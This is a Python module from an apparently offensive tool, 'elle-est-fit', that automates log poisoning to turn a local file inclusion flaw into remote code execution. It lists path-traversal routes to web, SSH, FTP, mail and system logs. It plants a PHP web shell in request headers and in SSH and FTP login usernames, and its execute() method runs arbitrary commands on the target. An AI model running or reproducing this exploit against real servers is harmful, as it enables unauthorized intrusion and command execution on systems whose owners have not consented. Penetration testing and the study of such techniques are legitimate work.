"""
Log Poisoning technique implementation for LFI to RCE exploitation.

This technique works by injecting PHP code into server logs (like Apache access logs,
SSH logs, FTP logs, etc.), and then including those logs via LFI to execute the injected code.
"""

import logging
import re
import random
import string
import socket
import time
import paramiko
import ftplib
import urllib.parse
from typing import List, Optional, Dict, Tuple

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase

logger = logging.getLogger("elle-est-fit")


class LogPoisoningTechnique(TechniqueBase):
    """
    Exploit LFI using log poisoning.

    This technique injects PHP code into server logs and then includes
    those logs to achieve remote code execution.
    """

    name = "log_poisoning"
    description = "LFI to RCE via log file poisoning"

    def __init__(self, **kwargs):
        """Initialize the Log Poisoning technique."""
        super().__init__(**kwargs)
        self.verbose = kwargs.get("verbose", False)
        self.shell_token = "".join(
            random.choice(string.ascii_letters) for _ in range(8)
        )
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
        self.hostname = self._extract_hostname()

        self.log_files = {
            "apache": [
                "../../../../var/log/apache2/access.log",
                "../../../var/log/apache2/access.log",
                "../../var/log/apache2/access.log",
                "../var/log/apache2/access.log",
                "../../../../var/log/apache2/error.log",
                "../../../var/log/apache2/error.log",
                "../../var/log/apache2/error.log",
                "../var/log/apache2/error.log",
                "../../../../usr/local/apache2/logs/access.log",
                "../../../usr/local/apache2/logs/access.log",
                "../../../../usr/local/apache/logs/access.log",
                "../../../usr/local/apache/logs/access.log",
            ],
            "httpd": [
                "../../../../var/log/httpd/access.log",
                "../../../var/log/httpd/access.log",
                "../../var/log/httpd/access.log",
                "../var/log/httpd/access.log",
                "../../../../var/log/httpd/error.log",
                "../../../var/log/httpd/error.log",
                "../../var/log/httpd/error.log",
                "../var/log/httpd/error.log",
            ],
            "nginx": [
                "../../../../var/log/nginx/access.log",
                "../../../var/log/nginx/access.log",
                "../../var/log/nginx/access.log",
                "../var/log/nginx/access.log",
                "../../../../var/log/nginx/error.log",
                "../../../var/log/nginx/error.log",
                "../../var/log/nginx/error.log",
                "../var/log/nginx/error.log",
            ],
            "ssh": [
                "../../../../var/log/auth.log",
                "../../../var/log/auth.log",
                "../../var/log/auth.log",
                "../var/log/auth.log",
                "../../../../var/log/secure",
                "../../../var/log/secure",
                "../../var/log/secure",
                "../var/log/secure",
                "../../../../var/log/sshd.log",
                "../../../var/log/sshd.log",
                "../../var/log/sshd.log",
                "../var/log/sshd.log",
            ],
            "ftp": [
                "../../../../var/log/vsftpd.log",
                "../../../var/log/vsftpd.log",
                "../../var/log/vsftpd.log",
                "../var/log/vsftpd.log",
                "../../../../var/log/pure-ftpd/pure-ftpd.log",
                "../../../var/log/pure-ftpd/pure-ftpd.log",
                "../../../../var/log/proftpd/proftpd.log",
                "../../../var/log/proftpd/proftpd.log",
            ],
            "mail": [
                "../../../../var/log/mail.log",
                "../../../var/log/mail.log",
                "../../../../var/log/maillog",
                "../../../var/log/maillog",
                "../../../../var/mail/www-data",
                "../../../var/mail/www-data",
                "../../../../var/mail/apache",
                "../../../var/mail/apache",
                "../../../../var/mail/nginx",
                "../../../var/mail/nginx",
            ],
            "system": [
                "../../../../var/log/syslog",
                "../../../var/log/syslog",
                "../../../../var/log/messages",
                "../../../var/log/messages",
            ],
            "other": [
                "../../../../proc/self/environ",
                "../../../proc/self/environ",
                "../../proc/self/environ",
                "../proc/self/environ",
                "../../../../proc/self/fd/0",
                "../../../proc/self/fd/0",
                "../../proc/self/fd/0",
                "../proc/self/fd/0",
            ],
        }

        self.log_signatures = {
            "apache": ["Apache", "GET /", "POST /", "HTTP/1."],
            "httpd": ["GET /", "POST /", "HTTP/1."],
            "nginx": ["nginx", "GET /", "POST /"],
            "ssh": [
                "sshd",
                "Failed password",
                "Accepted password",
                "authentication failure",
            ],
            "ftp": ["FTP", "RETR", "STOR", "USER", "PASS", "ftp"],
            "mail": ["mail", "from=", "to=", "relay="],
            "system": ["kernel", "systemd", "dhclient"],
        }

        self.log_file = None
        self.log_type = None
        self.shell_path = None

    def _extract_hostname(self) -> str:
        """Extract the hostname from the target URL."""
        if not self.target:
            return "localhost"

        try:
            match = re.search(r"https?://([^:/]+)", self.target)
            if match:
                return match.group(1)
            return "localhost"
        except Exception:
            return "localhost"

    def check(self) -> bool:
        """
        Check if the target is vulnerable to the Log Poisoning technique.

        Returns:
            True if the technique is viable, False otherwise
        """
        logger.info("Checking if target is vulnerable to log poisoning technique")

        # First, try to access log files by type
        for log_type, paths in self.log_files.items():
            for log_path in paths:
                try:
                    if self.verbose:
                        logger.debug(f"Testing log file: {log_path}")

                    test_response = self.leak_function(log_path)

                    # Skip empty responses
                    if not test_response or len(test_response) < 10:
                        continue

                    # Look for signatures of this log type
                    if log_type in self.log_signatures:
                        for signature in self.log_signatures[log_type]:
                            if signature in test_response:
                                logger.info(
                                    f"Found accessible {log_type} log file: {log_path}"
                                )
                                self.log_file = log_path
                                self.log_type = log_type
                                return True

                    # If we got here but don't recognize the content, check for generic log content
                    if any(
                        marker in test_response
                        for marker in [
                            "GET /",
                            "POST /",
                            "HTTP/1.",
                            "Mozilla",
                            "Chrome",
                            "Safari",
                        ]
                    ):
                        logger.info(
                            f"Found accessible log file (likely web server): {log_path}"
                        )
                        self.log_file = log_path
                        self.log_type = "web"
                        return True

                except Exception as e:
                    if self.verbose:
                        logger.debug(f"Error checking {log_path}: {str(e)}")

        logger.info("Could not find accessible log files")
        return False

    def exploit(self) -> bool:
        """
        Exploit the LFI using log poisoning to achieve RCE.

        Returns:
            True if successful, False otherwise
        """
        if not self.log_file or not self.log_type:
            if not self.check():
                logger.error("No accessible log files found")
                return False

        logger.info(f"Exploiting using log poisoning technique via {self.log_type} log")

        try:
            # Choose poisoning method based on log type
            if self.log_type in ["apache", "httpd", "nginx", "web"]:
                return self._poison_web_log()
            elif self.log_type == "ssh":
                return self._poison_ssh_log()
            elif self.log_type == "ftp":
                return self._poison_ftp_log()
            elif self.log_type == "mail":
                logger.info(
                    "Mail log poisoning detected, but automatic exploitation not implemented"
                )
                logger.info("Try manually sending an email with PHP code")
                return False
            else:
                # Try web poisoning as a fallback
                logger.info(
                    f"No specific poisoning method for {self.log_type}, trying web method"
                )
                return self._poison_web_log()

        except Exception as e:
            logger.error(f"Error during log poisoning exploitation: {str(e)}")
            return False

    def _poison_web_log(self) -> bool:
        """Poison a web server log file."""
        # Extract the base URL from the target
        base_url = re.sub(r"\{.*?\}", "", self.target)

        # Poison the log with a simple PHP payload
        php_payload = f"<?php echo '{self.detection_string}'; system($_GET['cmd']); ?>"

        # Add the PHP code in various request elements
        headers = {
            "User-Agent": php_payload,
            "X-Forwarded-For": php_payload,
            "Referer": php_payload,
            "Cookie": f"PHPSESSID={php_payload}",
        }

        # Make a request to poison the logs
        logger.info("Poisoning web server log file with PHP payload")
        poison_response = self.session.get(
            base_url, headers=headers, timeout=self.timeout
        )

        # Give the server some time to write the logs
        time.sleep(1)

        # Now include the log file and check if our payload was executed
        logger.info("Testing log poisoning")
        verification_response = self.leak_function(self.log_file + "?cmd=echo+TEST")

        if self.detection_string in verification_response:
            logger.info("Web log poisoning successful! RCE achieved.")
            self.shell_path = self.log_file
            return True
        else:
            logger.error("Failed to achieve RCE via web log poisoning")
            return False

    def _poison_ssh_log(self) -> bool:
        """Poison SSH log file."""
        logger.info("Attempting to poison SSH log...")

        # PHP payload as SSH username
        php_payload = f"<?php echo '{self.detection_string}'; system($_GET['cmd']); ?>"

        try:
            # Try to connect with PHP code as username
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                # The connection will fail but the PHP code will be logged
                ssh.connect(
                    self.hostname,
                    username=php_payload,
                    password="invalidpassword",
                    timeout=5,
                )
            except (paramiko.AuthenticationException, socket.error):
                # Expected to fail with auth error
                pass
            finally:
                ssh.close()

            # Give the server some time to write the logs
            time.sleep(1)

            # Now include the log file and check if our payload was executed
            logger.info("Testing SSH log poisoning")
            verification_response = self.leak_function(self.log_file + "?cmd=echo+TEST")

            if self.detection_string in verification_response:
                logger.info("SSH log poisoning successful! RCE achieved.")
                self.shell_path = self.log_file
                return True
            else:
                logger.error("Failed to achieve RCE via SSH log poisoning")
                return False

        except Exception as e:
            logger.error(f"Failed to poison SSH log: {str(e)}")
            return False

    def _poison_ftp_log(self) -> bool:
        """Poison FTP log file."""
        logger.info("Attempting to poison FTP log...")

        # PHP payload as FTP username
        php_payload = f"<?php echo '{self.detection_string}'; system($_GET['cmd']); ?>"

        try:
            # Try to connect with PHP code as username
            ftp = ftplib.FTP()
            ftp.connect(self.hostname, timeout=5)

            try:
                # The login will fail but the PHP code will be logged
                ftp.login(user=php_payload, passwd="invalidpassword")
            except ftplib.error_perm:
                # Expected to fail with permission error
                pass
            finally:
                ftp.close()

            # Give the server some time to write the logs
            time.sleep(1)

            # Now include the log file and check if our payload was executed
            logger.info("Testing FTP log poisoning")
            verification_response = self.leak_function(self.log_file + "?cmd=echo+TEST")

            if self.detection_string in verification_response:
                logger.info("FTP log poisoning successful! RCE achieved.")
                self.shell_path = self.log_file
                return True
            else:
                logger.error("Failed to achieve RCE via FTP log poisoning")
                return False

        except Exception as e:
            logger.error(f"Failed to poison FTP log: {str(e)}")
            return False

    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")

        # Encode the command
        encoded_command = urllib.parse.quote(command)

        try:
            # Execute the command by including the poisoned log file
            response = self.leak_function(self.shell_path + f"?cmd={encoded_command}")

            # Try to extract the command output
            if self.detection_string in response:
                # Extract the content after our detection string
                output_match = re.search(
                    f"{self.detection_string}(.*?)(PHP Warning|PHP Notice|<br>|$)",
                    response,
                    re.DOTALL,
                )
                if output_match:
                    return output_match.group(1).strip()

            # Fallback to returning the full response
            return response

        except Exception as e:
            raise ExecutionError(f"Failed to execute command: {str(e)}")
